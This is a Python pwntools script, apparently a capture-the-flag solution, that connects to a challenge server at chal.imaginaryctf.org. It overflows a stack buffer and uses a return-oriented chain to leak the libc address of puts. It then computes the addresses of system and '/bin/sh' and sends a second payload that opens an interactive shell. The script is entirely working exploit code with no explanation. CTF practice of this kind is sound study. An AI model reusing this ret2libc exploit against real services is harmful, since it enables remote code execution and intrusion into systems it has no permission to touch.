import base64
from pwn import *

p =remote('chal.imaginaryctf.org', 42020)



p.recvuntil('--\n')
raw_bin = base64.b64decode(p.recvline())
#print base64.b64encode(raw_bin)
offset = u64(raw_bin[0x1149:0x114b].ljust(8,'\0'))

print "offset: ",offset

puts_got = 0x404018
puts_plt = 0x401030
main = 0x401142
pop_rdi_ret = 0x000000000040120b
ret = 0x0000000000401016


payload = 'a' * offset
payload += 'AAAAAAAA'
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recv(1000)
p.sendline(payload)
print 'tanks: ',p.recvline()

leak = u64(p.recv(6).ljust(8,'\0'))


print hex(leak)
system = leak -0x2cf50
bin_sh = leak +0x10fc09


payload2 = 'a' * offset
payload2 += 'AAAAAAAA'
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(system)


p.sendline(payload2)

p.interactive()
